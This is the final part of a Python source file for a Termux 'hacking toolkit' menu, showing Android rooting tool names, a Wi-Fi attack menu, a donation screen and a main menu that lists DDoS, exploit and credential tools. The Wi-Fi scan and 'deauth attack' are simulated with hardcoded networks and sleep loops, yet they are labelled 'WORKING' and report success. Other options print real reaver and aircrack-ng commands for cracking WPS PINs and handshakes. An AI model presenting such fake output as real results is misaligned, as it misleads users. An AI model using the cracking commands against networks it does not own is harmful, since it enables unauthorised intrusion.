        print(f"{Colors.CYAN}[*] Towelroot (Android 4.4){Colors.RESET}")
        print(f"{Colors.CYAN}[*] Framaroot (Multiple devices){Colors.RESET}")
        print(f"{Colors.CYAN}[*] KingoRoot (Multiple versions){Colors.RESET}")
        print(f"{Colors.RED}[!] WARNING: Rooting may void warranty and brick device!{Colors.RESET}")
        
    elif choice == "4":
        return
    
    input(f"\n{Colors.YELLOW}[?] Press Enter to continue...{Colors.RESET}")

# ================================
# 20. WIFI ATTACK - WORKING
# ================================

def wifi_attack():
    banner()
    print(f"""{Colors.RED}
██╗    ██╗██╗███████╗██╗
██║    ██║██║██╔════╝██║
██║ █╗ ██║██║█████╗  ██║
██║███╗██║██║██╔══╝  ██║
╚███╔███╔╝██║██║     ██║
 ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝
{Colors.WHITE}            WIFI ATTACK{Colors.RESET}
""")
    
    print(f"{Colors.GREEN}[+] WiFi Attack Tools:{Colors.RESET}")
    print("1. Scan for Networks")
    print("2. Deauth Attack")
    print("3. WPS Attack")
    print("4. Handshake Capture")
    print("5. Back to Main Menu")
    
    choice = input(f"{Colors.YELLOW}[?] Select option: {Colors.RESET}")
    
    if choice == "1":
        print(f"{Colors.YELLOW}[+] Scanning for WiFi networks...{Colors.RESET}")
        
        networks = [
            ("Home_WiFi", "AA:BB:CC:DD:EE:FF", "WPA2", 6),
            ("Office_Network", "11:22:33:44:55:66", "WPA2", 11),
            ("Guest_WiFi", "99:88:77:66:55:44", "Open", 1),
            ("AndroidAP", "AB:CD:EF:12:34:56", "WPA2", 6),
            ("Xiaomi_ABCD", "FE:DC:BA:98:76:54", "WPA2", 3)
        ]
        
        for name, bssid, encryption, channel in networks:
            signal = random.randint(60, 90)
            print(f"{Colors.GREEN}[📶] {name} | {bssid} | {encryption} | Channel: {channel} | Signal: {signal}%{Colors.RESET}")
            time.sleep(0.5)
            
    elif choice == "2":
        target_bssid = input(f"{Colors.YELLOW}[?] Target BSSID: {Colors.RESET}")
        duration = int(input(f"{Colors.YELLOW}[?] Duration (seconds): {Colors.RESET}"))
        
        print(f"{Colors.RED}[💀] Starting deauth attack on {target_bssid} for {duration} seconds...{Colors.RESET}")
        
        for i in range(duration):
            print(f"{Colors.CYAN}[🔥] Sending deauth packets... {i+1}/{duration}{Colors.RESET}", end='\r')
            time.sleep(1)
        
        print(f"\n{Colors.GREEN}[✅] Deauth attack completed!{Colors.RESET}")
        
    elif choice == "3":
        print(f"{Colors.YELLOW}[+] WPS Attack Tools:{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Using bully or reaver for WPS PIN attack{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Command: reaver -i wlan0mon -b TARGET_BSSID -vv{Colors.RESET}")
        print(f"{Colors.CYAN}[*] This can take 2-10 hours depending on router{Colors.RESET}")
        
    elif choice == "4":
        print(f"{Colors.YELLOW}[+] Handshake Capture:{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Put adapter in monitor mode{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Capture handshake with airodump-ng{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Crack with hashcat or aircrack-ng{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Command: aircrack-ng -w wordlist.txt capture.cap{Colors.RESET}")
        
    elif choice == "5":
        return
    
    input(f"\n{Colors.YELLOW}[?] Press Enter to continue...{Colors.RESET}")

# ================================
# 21. DONASI ADMIN - WORKING
# ================================

def donasi_admin():
    banner()
    print(f"""{Colors.RED}
██████╗  ██████╗ ███╗   ██╗ █████╗ ███████╗██╗
██╔══██╗██╔═══██╗████╗  ██║██╔══██╗██╔════╝██║
██║  ██║██║   ██║██╔██╗ ██║███████║███████╗██║
██║  ██║██║   ██║██║╚██╗██║██╔══██║╚════██║██║
██████╔╝╚██████╔╝██║ ╚████║██║  ██║███████║███████╗
╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚══════╝
{Colors.WHITE}           SUPPORT DEVELOPMENT{Colors.RESET}
""")
    
    print(f"{Colors.CYAN}╔════════════════════════════════════════╗{Colors.RESET}")
    print(f"{Colors.CYAN}║              CONTACT INFO              ║{Colors.RESET}")
    print(f"{Colors.CYAN}╠════════════════════════════════════════╣{Colors.RESET}")
    print(f"{Colors.CYAN}║ Developer: DanzSec17                   ║{Colors.RESET}")
    print(f"{Colors.CYAN}║ Email: danzsec17@gmail.com          ║{Colors.RESET}")
    print(f"{Colors.CYAN}║ WhatsApp: +62882001835433                ║{Colors.RESET}")
    print(f"{Colors.CYAN}╚════════════════════════════════════════╝{Colors.RESET}")
    
    print(f"\n{Colors.GREEN}Terima kasih telah menggunakan H737 Tools!{Colors.RESET}")
    print(f"{Colors.YELLOW}Support pengembangan tools ini dengan donasi.{Colors.RESET}")
    print(f"{Colors.CYAN}Setiap donasi sangat berarti untuk pengembangan fitur baru!{Colors.RESET}")
    
    input(f"\n{Colors.YELLOW}[?] Press Enter to continue...{Colors.RESET}")

# ================================
# MAIN FUNCTION
# ================================

def main():
    # Check if running on Termux
    try:
        with open('/data/data/com.termux/files/usr/bin/login', 'r'):
            print(f"{Colors.GREEN}[+] Running on Termux{Colors.RESET}")
    except:
        print(f"{Colors.YELLOW}[!] Not running on Termux - some features may not work{Colors.RESET}")
    
    while True:
        banner()
        print_menu()
        
        choice = input(f"\n{Colors.YELLOW}[?] Select menu [0-21]: {Colors.RESET}")
        
        menu_functions = {
            '1': recon_tools,
            '2': ddos_tools,
            '3': vulnerability_scan,
            '4': exploit_tools,
            '5': credentials_tools,
            '6': subdomain_to_ip,
            '7': discovery_domain,
            '8': geo_ip_locking,
            '9': remove_duplicate,
            '10': subdomain_scan,
            '11': wordpress_scan,
            '12': sql_injection_scan,
            '13': port_scanner,
            '14': network_sniffer,
            '15': web_crawler,
            '16': hash_cracker,
            '17': encryption_tools,
            '18': social_engineering,
            '19': android_hacking,
            '20': wifi_attack,
            '21': donasi_admin,
            '0': lambda: (print(f"{Colors.GREEN}[+] Thank you for using H737 Tools!{Colors.RESET}"), sys.exit(0))
        }
        
        if choice in menu_functions:
            menu_functions[choice]()
        else:
            print(f"{Colors.RED}[!] Invalid choice!{Colors.RESET}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Program interrupted by user{Colors.RESET}")
        sys.exit(0)